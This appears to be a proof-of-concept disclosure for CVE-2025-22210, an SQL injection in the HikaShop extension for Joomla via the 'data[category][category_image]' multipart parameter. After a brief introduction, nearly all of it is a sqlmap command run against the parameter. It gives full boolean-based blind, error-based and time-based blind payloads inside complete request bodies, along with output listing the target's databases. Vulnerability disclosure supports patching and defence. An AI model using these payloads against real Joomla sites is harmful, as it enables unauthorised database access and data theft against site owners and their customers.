# CVE-2025-22210: SQL injection in HikaShop for Joomla!

**CVE Link:** https://www.cve.org/CVERecord?id=CVE-2025-22210

**HikaShop:** https://extensions.joomla.org/extension/hikashop/

## Introduction
An SQL injection vulnerability in the HikaShop plugin for Joomla (versions 3.3.0-5.1.4) allows authenticated attackers (administrator) to execute arbitrary SQL commands via the 'data[category][category_image]' parameter in a multipart request.

## POC

**Exploit:**

```
ubuntu@host:~$ python3 sqlmap.py -r ~/req.txt --batch --dbs --dbms=mysql -p 'MULTIPART data[category][category_image]'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.1.2#dev}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

---
Parameter: MULTIPART data[category][category_image] ((custom) POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: ------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_name]"

Computing
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="category_description"

<p>elementum condimentum, massa odio varius est, et auctor purus orci quis dolor. Ut at est quis sapien scelerisque malesuada. Quisque at velit mi, vel pharetra ante. Sed auctor cursus nunc non commodo. Quisque iaculis lacus ac erat mollis blandit. Curabitur sagittis sodales elit vel gravida.</p>
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_meta_description]"

test
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_keywords]"

test
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_page_title]"

test
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_alias]"

computing
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_canonical]"

test
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_image]"

(SELECT (CASE WHEN (1207=1207) THEN 138 ELSE (SELECT 7694 UNION SELECT 1128) END))
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_published]"

1
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_parent_id]"

2
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_layout]"


------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_quantity_layout]"


------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="cid[]"

17
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_id]"

17
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="option"

com_hikashop
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="task"

apply
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="ctrl"

category
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="c3e499b1cbbac8cdcde769da027d4311"

1
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a--

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: ------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_name]"

Computing
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="category_description"

<p>elementum condimentum, massa odio varius est, et auctor purus orci quis dolor. Ut at est quis sapien scelerisque malesuada. Quisque at velit mi, vel pharetra ante. Sed auctor cursus nunc non commodo. Quisque iaculis lacus ac erat mollis blandit. Curabitur sagittis sodales elit vel gravida.</p>
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_meta_description]"

test
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_keywords]"

test
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_page_title]"

test
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_alias]"

computing
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_canonical]"

test
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_image]"

138 AND GTID_SUBSET(CONCAT(0x716a7a7171,(SELECT (ELT(8577=8577,1))),0x716a6b7171),8577)
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_published]"

1
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_parent_id]"

2
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_layout]"


------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_quantity_layout]"


------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="cid[]"

17
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_id]"

17
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="option"

com_hikashop
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="task"

apply
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="ctrl"

category
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="c3e499b1cbbac8cdcde769da027d4311"

1
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_name]"

Computing
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="category_description"

<p>elementum condimentum, massa odio varius est, et auctor purus orci quis dolor. Ut at est quis sapien scelerisque malesuada. Quisque at velit mi, vel pharetra ante. Sed auctor cursus nunc non commodo. Quisque iaculis lacus ac erat mollis blandit. Curabitur sagittis sodales elit vel gravida.</p>
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_meta_description]"

test
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_keywords]"

test
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_page_title]"

test
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_alias]"

computing
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_canonical]"

test
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_image]"

138 AND (SELECT 9699 FROM (SELECT(SLEEP(5)))OMJl)
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_published]"

1
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_parent_id]"

2
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_layout]"


------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_quantity_layout]"


------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="cid[]"

17
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="data[category][category_id]"

17
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="option"

com_hikashop
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="task"

apply
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="ctrl"

category
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a
Content-Disposition: form-data; name="c3e499b1cbbac8cdcde769da027d4311"

1
------WebKitFormBoundaryLKq2Qx6FA5Abqo8a--
---

available databases [3]:
[*] information_schema
[*] joomla_db
[*] performance_schema
```
